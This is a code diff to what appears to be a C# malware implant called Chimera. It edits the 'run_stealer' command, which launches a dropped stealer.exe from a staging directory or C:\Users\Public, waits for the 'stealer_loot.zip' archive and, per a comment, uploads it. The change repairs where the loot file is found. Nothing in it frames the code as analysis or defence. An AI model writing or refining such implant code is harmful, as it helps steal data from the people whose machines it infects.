@@ -10,8 +10,6 @@ namespace Chimera.Commands
     // run_stealer                        — launch stealer.exe from staging dir, wait for loot zip, upload it
     public static class InjectAssembly
     {
-        private static readonly string LootPath = Path.Combine(Staging.Dir, "stealer_loot.zip");
-
         // stealer.exe is dropped by the DLL alongside chimera.exe.
         // Look next to the running exe first, fall back to C:\Users\Public.
         private static string GetStealerPath()
@@ -20,6 +18,13 @@ namespace Chimera.Commands
                 System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
             string beside = Path.Combine(dir, "stealer.exe");
             return File.Exists(beside) ? beside : @"C:\Users\Public\stealer.exe";
+        }
+
+        // Loot zip is written by stealer.exe to its own working directory.
+        private static string GetLootPath()
+        {
+            string stealerDir = Path.GetDirectoryName(GetStealerPath()) ?? Staging.Dir;
+            return Path.Combine(stealerDir, "stealer_loot.zip");
         }
         private const int PollSec = 120;
 
@@ -89,6 +94,7 @@ namespace Chimera.Commands
                 Staging.EnsureDir();
 
                 string StealerExe = GetStealerPath();
+                string LootPath   = GetLootPath();
                 if (!File.Exists(StealerExe))
                     return "[error] stealer.exe not found at " + StealerExe;
 
